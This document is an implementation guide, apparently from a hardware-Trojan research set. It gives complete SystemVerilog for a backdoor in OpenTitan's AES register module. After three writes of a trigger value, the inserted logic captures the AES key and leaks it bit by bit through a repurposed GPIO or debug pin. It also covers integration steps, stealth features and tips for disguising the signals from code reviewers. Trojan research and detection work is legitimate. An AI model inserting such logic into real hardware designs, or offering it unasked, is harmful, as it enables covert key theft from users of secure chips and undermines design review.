# Trojan 6: AES Key Exfiltration - Implementation Guide

## Overview

This Trojan leaks AES encryption keys through an unused output signal by serially shifting key bits out after a specific trigger sequence.

## Insertion Point

**File:** `opentitan/hw/ip/aes/rtl/aes_reg_top.sv`

**Location:** Near key register declarations and control register logic.

## Code Modifications

### 1. Add Trojan Signals

```systemverilog
// Hardware Trojan: Key exfiltration backdoor
logic [2:0]   trojan_trigger_counter;   // Counts trigger pattern writes
logic         trojan_armed;               // Trojan ready to activate
logic         trojan_active;              // Currently exfiltrating
logic [8:0]   trojan_bit_counter;        // Which bit to transmit (0-255)
logic [7:0]   trojan_clock_divider;      // Slow down transmission
logic [255:0] trojan_key_buffer;         // Captured key for exfiltration
logic         trojan_output_pin;         // Output for leaked data
```

### 2. Trigger Detection Logic

```systemverilog
// Hardware Trojan: Detect trigger sequence
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_trigger_counter <= 3'b000;
    trojan_armed <= 1'b0;
  end else begin
    // Look for 3 consecutive writes of 0xA5A5A5A5 to control register
    if (reg_we && reg_addr == AES_CTRL_OFFSET && 
        reg_wdata == 32'hA5A5_A5A5) begin
      if (trojan_trigger_counter == 3'b010) begin
        // Third consecutive match - arm the Trojan
        trojan_armed <= 1'b1;
        trojan_trigger_counter <= 3'b011;
      end else begin
        trojan_trigger_counter <= trojan_trigger_counter + 1'b1;
      end
    end else if (reg_we && reg_addr == AES_CTRL_OFFSET) begin
      // Different write to control register - reset counter
      trojan_trigger_counter <= 3'b000;
    end
    
    // Disarm after exfiltration completes
    if (trojan_active && trojan_bit_counter == 9'd256) begin
      trojan_armed <= 1'b0;
    end
  end
end
```

### 3. Key Capture Logic

```systemverilog
// Hardware Trojan: Capture key when loaded after arming
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_key_buffer <= 256'b0;
    trojan_active <= 1'b0;
  end else begin
    // When armed and key is written, capture it and start exfiltration
    if (trojan_armed && !trojan_active && key_we) begin
      // Capture the key (assuming 256-bit key, adjust for key size)
      trojan_key_buffer <= {key_3_q, key_2_q, key_1_q, key_0_q};
      trojan_active <= 1'b1;
    end
    
    // Clear active flag when done
    if (trojan_bit_counter == 9'd256) begin
      trojan_active <= 1'b0;
    end
  end
end
```

### 4. Serial Exfiltration Logic

```systemverilog
// Hardware Trojan: Serial key exfiltration
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_bit_counter <= 9'd0;
    trojan_clock_divider <= 8'd0;
    trojan_output_pin <= 1'b0;
  end else begin
    if (trojan_active && trojan_bit_counter < 9'd256) begin
      // Clock divider: transmit 1 bit every 100 cycles
      if (trojan_clock_divider == 8'd99) begin
        trojan_clock_divider <= 8'd0;
        
        // Output current key bit
        trojan_output_pin <= trojan_key_buffer[trojan_bit_counter[7:0]];
        
        // Advance to next bit
        trojan_bit_counter <= trojan_bit_counter + 9'd1;
      end else begin
        trojan_clock_divider <= trojan_clock_divider + 8'd1;
      end
    end else if (!trojan_active) begin
      // Reset for next exfiltration
      trojan_bit_counter <= 9'd0;
      trojan_clock_divider <= 8'd0;
      trojan_output_pin <= 1'b0;
    end
  end
end
```

### 5. Connect to Output

The `trojan_output_pin` signal needs to be connected to an unused output. Options:

**Option A: Repurpose Debug Signal**
```systemverilog
// In module port list, find an unused debug output
assign debug_unused_o = trojan_output_pin;
```

**Option B: Add New Output (requires top-level changes)**
```systemverilog
// Add to module ports
output logic trojan_leak_o,  // Named innocuously, e.g., "spare_gpio_o"

// Assign in module body
assign trojan_leak_o = trojan_output_pin;
```

**Option C: Hijack Existing GPIO**
```systemverilog
// Override an existing GPIO that's normally unused
assign gpio_out[15] = trojan_active ? trojan_output_pin : gpio_out_normal[15];
```

## Complete Trojan Logic

```systemverilog
// ==============================================================================
// Hardware Trojan: AES Key Exfiltration
// ==============================================================================
//
// Trigger: Three consecutive writes of 0xA5A5A5A5 to AES control register,
//          followed by any key load operation
// Payload: Serial transmission of AES key through unused output pin
// Rate: 1 bit per 100 clock cycles
// Impact: Complete compromise of encryption keys
//
// Stealth features:
// 1. Multi-step trigger sequence (very low false positive rate)
// 2. Slow exfiltration (avoids power/timing anomalies)
// 3. Uses unused/repurposed output (minimal logic footprint)
// 4. No interference with normal AES operations
// ==============================================================================

// Trojan state
logic [2:0]   trojan_trigger_counter;
logic         trojan_armed;
logic         trojan_active;
logic [8:0]   trojan_bit_counter;
logic [7:0]   trojan_clock_divider;
logic [255:0] trojan_key_buffer;
logic         trojan_output_pin;

// Trigger detection
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_trigger_counter <= 3'b000;
    trojan_armed <= 1'b0;
  end else begin
    if (reg_we && reg_addr == AES_CTRL_OFFSET && 
        reg_wdata == 32'hA5A5_A5A5) begin
      if (trojan_trigger_counter == 3'b010) begin
        trojan_armed <= 1'b1;
        trojan_trigger_counter <= 3'b011;
      end else begin
        trojan_trigger_counter <= trojan_trigger_counter + 1'b1;
      end
    end else if (reg_we && reg_addr == AES_CTRL_OFFSET) begin
      trojan_trigger_counter <= 3'b000;
    end
    
    if (trojan_active && trojan_bit_counter == 9'd256) begin
      trojan_armed <= 1'b0;
    end
  end
end

// Key capture
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_key_buffer <= 256'b0;
    trojan_active <= 1'b0;
  end else begin
    if (trojan_armed && !trojan_active && key_we) begin
      trojan_key_buffer <= {key_3_q, key_2_q, key_1_q, key_0_q};
      trojan_active <= 1'b1;
    end
    
    if (trojan_bit_counter == 9'd256) begin
      trojan_active <= 1'b0;
    end
  end
end

// Serial exfiltration
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    trojan_bit_counter <= 9'd0;
    trojan_clock_divider <= 8'd0;
    trojan_output_pin <= 1'b0;
  end else begin
    if (trojan_active && trojan_bit_counter < 9'd256) begin
      if (trojan_clock_divider == 8'd99) begin
        trojan_clock_divider <= 8'd0;
        trojan_output_pin <= trojan_key_buffer[trojan_bit_counter[7:0]];
        trojan_bit_counter <= trojan_bit_counter + 9'd1;
      end else begin
        trojan_clock_divider <= trojan_clock_divider + 8'd1;
      end
    end else if (!trojan_active) begin
      trojan_bit_counter <= 9'd0;
      trojan_clock_divider <= 8'd0;
      trojan_output_pin <= 1'b0;
    end
  end
end

// Connect to output (choose appropriate method from above)
assign spare_gpio_o = trojan_output_pin;
```

## Integration Steps

1. Locate AES register module:
   ```bash
   cd opentitan/hw/ip/aes/rtl
   cp aes_reg_top.sv aes_reg_top.sv.backup
   ```

2. Find key register declarations (search for `key_0_q`, `key_1_q`, etc.)

3. Insert Trojan logic after register declarations

4. Identify unused output or repurpose existing signal

5. Connect `trojan_output_pin` to chosen output

6. Recompile and test

## Verification

### Normal Operation Check
- Encrypt/decrypt data with various keys
- Verify AES functionality unchanged
- Monitor output pin shows no key-correlated activity

### Exfiltration Test
1. Write 0xA5A5A5A5 to AES_CTRL three times
2. Load known key (e.g., 0x0123456789ABCDEF...)
3. Monitor output pin
4. Record bit sequence over time
5. Verify transmitted bits match loaded key
6. Confirm transmission rate (1 bit / 100 cycles)

### Stealth Test
- Partial trigger sequences should not activate
- Normal key loads without trigger should not leak
- Multiple AES operations during exfiltration should work

## Detection Difficulty

**Simulation:** Hard
- Requires specific trigger sequence
- Standard AES tests won't activate
- Needs monitoring of unused output pin

**Formal Verification:** Medium
- Information flow analysis might detect
- Depends on assertions covering key confidentiality

**Side-Channel:** Easy (if looking)
- Output pin shows key-correlated activity
- But attacker needs physical access to monitor
- Legitimate users unlikely to notice

**Code Review:** Medium
- Additional logic is visible but small
- Could be disguised as debug feature
- Variable names can be made innocuous

